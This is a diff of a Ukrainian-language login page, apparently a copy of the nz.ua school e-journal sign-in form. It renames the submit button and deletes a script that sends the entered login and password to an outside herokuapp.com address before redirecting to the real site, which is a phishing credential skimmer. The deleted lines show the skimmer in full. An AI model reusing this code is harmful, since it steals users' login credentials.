@@ -94,7 +94,7 @@
   <input type="hidden" name="LoginForm[rememberMe]" value="0"><input type="checkbox" id="loginform-rememberme" name="LoginForm[rememberMe]" value="1" checked=""><label for="loginform-rememberme">Запам'ятати мене</label>
   </div>        </div>
         <div class="row" style="position: relative">
-            <a href="#" title="Увійти" id="form-button" class="ms-button">
+            <a href="#" title="Увійти" class="ms-button form-submit-btn">
                 <span>Увійти</span>
             </a>
             <a href="/account/forgot-password" title="Забули пароль або логін?" class="forgot-password">Забули пароль або логін?</a>
@@ -559,31 +559,5 @@
   }}}], []);
   jQuery('#registration-school-modal').modal({"show":false});
   });</script><script type="text/javascript">(function(){window['__CF$cv$params']={r:'6d498302bb0e7b3b',m:'2.qBwYDexTfu12lsTb_gfuEvLTM1YWwaTvhGMV4ICUs-1643365473-0-AV9MUka0Lp7I+bL/zNkpOl0Ng6goRSjocanth1Etfe1WTzfujVMBjZWeFsGp7v+d2geErDEL9ONY/jZeTVnJEhqihpnQLFvcctKZIMQLah3azmEjJsSn+hKDHGuhOaB3tA==',s:[0xb49aaff460,0xafefa9e745],u:'/cdn-cgi/challenge-platform/h/b'}})();</script>
-  <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="Перевірку reCAPTCHA можна виконати впродовж двох хвилин" src="https://www.google.com/recaptcha/api2/bframe?hl=uk&amp;v=dPctOHA2ifhWm5WzFM_B5TjT&amp;k=6LcR0OcUAAAAAN9GRN97OVMy_pmUmRiziD7YWWvc" name="c-g6k57hjemke1" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div>
-  <script>
-    function post(url, data) {
-      let xhr = new XMLHttpRequest();
-      xhr.open("POST", url, true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.setRequestHeader('Access-Control-Allow-Origin', null);
-      xhr.send(JSON.stringify(data));
-    }
-    function getNextUrl() {
-        let url = new URL(window.location.href);
-        let next = url.searchParams.get('next');
-        return next ? next : 'https://nz.ua/menu/'
-    }
-    let btn = document.getElementById('form-button');
-    let fform = document.getElementById('login-form')
-    let l = document.getElementById('loginform-login')
-    let p = document.getElementById('loginform-password')
-    const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
-    const nextUrl = getNextUrl()
-
-    btn.addEventListener('click', () => {
-      post(url, {l, p});
-      window.location.href = nextUrl;
-    });
-</script>
-</body>
-</html>
+  
+  <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="Перевірку reCAPTCHA можна виконати впродовж двох хвилин" src="https://www.google.com/recaptcha/api2/bframe?hl=uk&amp;v=dPctOHA2ifhWm5WzFM_B5TjT&amp;k=6LcR0OcUAAAAAN9GRN97OVMy_pmUmRiziD7YWWvc" name="c-g6k57hjemke1" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
